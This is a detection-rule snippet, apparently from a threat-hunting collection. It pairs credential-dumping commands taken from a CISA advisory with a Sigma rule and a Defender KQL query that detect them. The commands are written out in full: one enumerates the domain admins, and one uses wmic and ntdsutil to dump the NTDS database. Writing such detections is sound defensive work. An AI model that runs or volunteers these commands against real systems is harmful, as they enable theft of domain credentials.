### Credential Dumping to ADMIN localhost

```pwsh
cmd.exe /Q /c cd 1> \\127.0.0.1\ADMIN$\__ 2>&1

cmd.exe /Q /c net group “domain admins" /dom 1>\\127.0.0.1\ADMIN$\__ 2>&1

cmd.exe /Q /c wmic process call create “cmd.exe /c mkdir C:\Windows\Temp\tmp & ntdsutil \"ac i ntds\" ifm \"create full C:\Windows\Temp\tmp\" 1> \\127.0.0.1\ADMIN$\ 2>&1
```

Sigma:

```yaml
title: APT Credential Dumping to ADMIN localhost
id: 508fa282-c63e-4382-817a-4704df88aa3b
status: experimental
description: Detects the credential dumping, creating a dump in the ADMIN tmp.
references:
    - https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-144a
author: sim
date:
tags:
    - attack.credential_access
    - attack.defense_evasion
    - attack.t1003.003 #OS Credential Dumping: NTDS

logsource:
    category: process_creation
    product: windows
detection:
    selection_img:
        - Image|endswith: '\cmd.exe'
        - OriginalFileName: 'cmd.exe'
    selection_flag:
        CommandLine|contains: '/c wmic process call create'
    selection_key:
        CommandLine|contains:
            - '"cmd.exe /c mkdir C:\Windows\Temp\tmp'
            - '& ntdsutil \"ac i ntds\" ifm \"create full C:\Windows\Temp\tmp\" 1> \\127.0.0.1\ADMIN$\ 2>&1'
    condition: all of selection_*
falsepositives:
    - not known
level: high
```

MDE
```sql
DeviceProcessEvents | where ((FolderPath endswith @'\cmd.exe' or InitiatingProcessVersionInfoOriginalFileName =~ @'cmd.exe' or ProcessVersionInfoOriginalFileName =~ @'cmd.exe') and ProcessCommandLine contains @'/c wmic process call create' and (ProcessCommandLine contains @'"cmd.exe /c mkdir C:\Windows\Temp\tmp' or ProcessCommandLine contains @'& ntdsutil \"ac i ntds\" ifm \"create full C:\Windows\Temp\tmp\" 1> \\127.0.0.1\ADMIN$\ 2>&1'))
```


